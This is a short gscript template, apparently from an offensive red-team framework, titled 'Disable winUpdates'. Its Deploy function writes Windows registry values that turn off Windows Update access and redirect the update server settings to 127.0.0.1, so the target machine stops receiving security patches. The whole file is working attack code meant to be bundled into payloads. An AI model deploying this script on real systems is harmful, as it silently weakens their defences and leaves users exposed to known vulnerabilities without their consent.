// Example gscript template
// Title: Disable winUpdates
// Author: ahhh
// Purpose: Disables a bunch of windows updates
// Gscript version: 1.0.0
// ATT&CK: 

//priority:96
//timeout:150

//go_import:github.com/gen0cide/gscript/x/windows as windows

function Deploy() {
    console.log("Starting Disable WinUpdates");

    var value1 = 1;
    var value2 = "http://127.0.0.1";

    windows.AddRegKeyDWORD("LOCAL_MACHINE", "SYSTEM\\Internet Communication Management\\Internet Communication", "DisableWindowsUpdateAccess", value1);
    windows.AddRegKeyDWORD("CURRENT_USER", "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\WindowsUpdate", "DisableWindowsUpdateAccess", value1);
    windows.AddRegKeyDWORD("CURRENT_USER", "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoWindowsUpdate", value1);
    windows.AddRegKeyDWORD("LOCAL_MACHINE", "SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU", "UseWUServer", value1);
    windows.AddRegKeyDWORD("LOCAL_MACHINE", "SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU", "AUOptions", value1);
    windows.AddRegKeyString("LOCAL_MACHINE", "SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU", "WUServer", value2);
    windows.AddRegKeyString("LOCAL_MACHINE", "SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU", "WUStatusServer", value2);

    console.log("Done Disable WinUpdates");
    return true;
  }
  